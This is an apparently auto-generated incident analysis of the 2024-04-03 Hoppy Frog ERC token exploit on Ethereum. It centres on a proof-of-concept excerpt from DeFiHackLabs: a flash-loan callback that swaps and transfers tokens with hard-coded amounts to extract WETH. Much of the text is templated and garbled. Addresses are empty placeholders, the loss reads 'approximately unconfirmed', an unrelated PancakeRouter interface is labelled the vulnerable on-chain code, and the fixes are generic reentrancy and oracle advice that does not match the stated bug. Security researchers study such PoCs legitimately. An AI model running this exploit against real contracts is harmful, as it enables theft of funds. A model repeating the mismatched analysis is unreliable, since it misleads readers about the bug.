# Hoppy Frog ERC — Analysis of Balance Update Error in Custom ERC Implementation

| Item | Details |
|------|------|
| **Date** | 2024-04-03 |
| **Protocol** | Hoppy Frog ERC |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://etherscan.io/address/0x) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Balance update error in custom ERC implementation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/HoppyFrogERC_exp.sol) |

---
## 1. Vulnerability Overview

Hoppy Frog ERC is a DeFi protocol operating on the Ethereum chain that was attacked on 2024-04-03 via an **ERC implementation vulnerability**.
The attacker exploited a balance update error in the custom ERC implementation, causing approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: ERC implementation vulnerability
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Logic vulnerability

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Example of vulnerable implementation
// Issue: Balance update error in custom ERC implementation
// The attacker exploits this logic to obtain illegitimate gains

// Hoppy Frog ERC Vulnerability — Custom ERC Balance Update Error
interface Uni_Pair_V3 {
    // ❌ Vulnerable: exploits custom ERC balance update bug inside uniswapV3FlashCallback
    // Incorrect order of balance deduction in _transfer logic during flash execution allows double balance acquisition
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface Uni_Router_V2 {
    // ❌ Vulnerable: executing swap in an erroneous balance state realizes profit using inflated balance
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// ✅ Correct implementation: guaranteed balance update order in ERC20 _transfer
function safeTransfer(address from, address to, uint256 amount) internal {
    // ✅ Deduct sender balance first (prevents reentrancy or double transfer)
    require(balanceOf[from] >= amount, "Transfer: insufficient balance");
    balanceOf[from] -= amount;  // ✅ Deduct first
    balanceOf[to] += amount;    // ✅ Increase second
    emit Transfer(from, to, amount);
    // ✅ Fee processing only after deduction/increase
}
```

---
### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: PancakeRouter.sol
contract IPancakePair {
    function balanceOf(address owner) external view returns (uint);  // ❌ Vulnerability
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Vulnerability Identification] ─────── Hoppy Frog ERC Contract
  │
  ▼
[Malicious Transaction Submission] ─── Vulnerable Function Call
  │                                      (Validation Bypass)
  ▼
[Asset Theft] ──────────────────────── Profit Secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - HoppyFrogERC_exp.sol
// Chain: Ethereum | Date: 2024-04-03

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), 18);
        uint256 amount = Hoppy.balanceOf(address(Pair));
        Pair.flash(address(this), 0, amount, "123");
        emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), 18);
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        Hoppy.approve(address(Router), type(uint256).max);
        swap_token_to_token(address(Hoppy), address(WETH), 3_071_435_167_652_113_869_853);
        Hoppy.transfer(address(Hoppy), 206_900_000_001_000_000_000);
        swap_token_to_token(address(Hoppy), address(WETH), 4_206_900_000_000_000_000_000);
        swap_token_to_ExactToken(
            7_560_087_519_329_645_008_552, address(WETH), address(Hoppy), 3_907_363_705_363_283_233
        );
        Hoppy.transfer(address(msg.sender), 7_560_087_519_329_645_008_552);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function swap_token_to_ExactToken(uint256 amountout, address a, address b, uint256 amountInMax) public payable {
        IERC20(a).approve(address(Router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapTokensForExactTokens(amountout, amountInMax, path, address(this), block.timestamp + 120);
    }
}

```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criteria | Details |
|-----------|------|
| **DASP Top 10** | Logic vulnerability |
| **Attack Type** | Smart contract bug |
| **Vulnerability Category** | DeFi attack |
| **Attack Complexity** | Medium |
| **Preconditions** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable function**: Apply emergency pause to the attacked function
2. **Assess damage**: Classify the scale of lost assets and affected users
3. **Notify relevant parties**: Immediately alert related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (minimum 2 audit firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **ERC implementation vulnerability attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: All functions must be designed with an attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormally large transactions
2. **Incident response plan**: Maintain a response manual that can be executed immediately upon an attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-04-03** Hoppy Frog ERC incident reaffirms the danger of **ERC implementation vulnerability** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was prepared for educational and security research purposes. Unauthorized use is prohibited.*
*PoC original: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/HoppyFrogERC_exp.sol)*